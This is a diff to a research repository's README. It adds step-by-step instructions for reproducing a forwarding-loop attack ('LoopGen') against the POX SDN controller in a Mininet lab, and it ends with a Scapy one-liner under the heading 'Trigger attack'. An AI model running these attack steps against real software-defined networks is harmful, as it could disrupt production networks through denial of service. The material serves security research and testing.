@@ -3,7 +3,8 @@
 This experiment was performed on an Ubuntu 22.04 Desktop VM. As a prerequisite for the procedures outlined below, the underlying environment was preconfigured with Mininet, Python 3, and the Scapy packet-manipulation library. Additionally, three distinct SDN controllers were compiled and deployed directly from their respective source code repositories.
 
 1. [Ryu](#Ryu)
-2. [POX](#POX)
+2. [POX](#POX (Layer 2))
+3. [POX](#POX (Layer 3))
 
 ## Ryu
 First, purge and reset the residual virtual network state and cache within the Mininet environment.
@@ -52,4 +53,43 @@ mininet> h1 python3 -c "from scapy.all import sendp, Ether, IP, UDP; sendp(Ether
 ![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/8.png)
 ![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/9.png)
 
-## POX
+## POX (Layer 2)
+First, purge and reset the residual virtual network state and cache within the Mininet environment.
+```bash
+sudo mn -c
+```
+![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/POX/L2/1.png)
+
+Subsequently, initialize and launch the SDN controller service.
+```bash
+./pox.py log.level --DEBUG openflow.of_01 --port=6633 forwarding.l2_learning
+```
+![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/POX/L2/2.png)
+
+Next, load and instantiate the predefined Mininet network topology.
+```bash
+sudo python3 -E LoopGen_topo.py
+```
+![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/POX/L2/3.png)
+
+Open the host terminal
+```bash
+mininet> xterm h1 h2 h3
+```
+
+Send packets in each host terminal
+```bash
+# Node: h1
+python3 LoopGen_packets.py h1-eth0 00:00:00:00:00:02
+
+# Node: h2
+python3 LoopGen_packets.py h2-eth0 00:00:00:00:00:03
+
+# Node: h3
+python3 LoopGen_packets.py h3-eth0 00:00:00:00:00:01
+```
+
+Trigger attack
+```bash
+mininet> h1 python3 -c "from scapy.all import sendp, Ether, IP, UDP; sendp(Ether(src='00:00:00:00:00:01', dst='00:00:00:00:00:08')/IP(dst='10.0.0.8')/UDP(dport=9999), iface='h1-eth0', count=1)"
+```
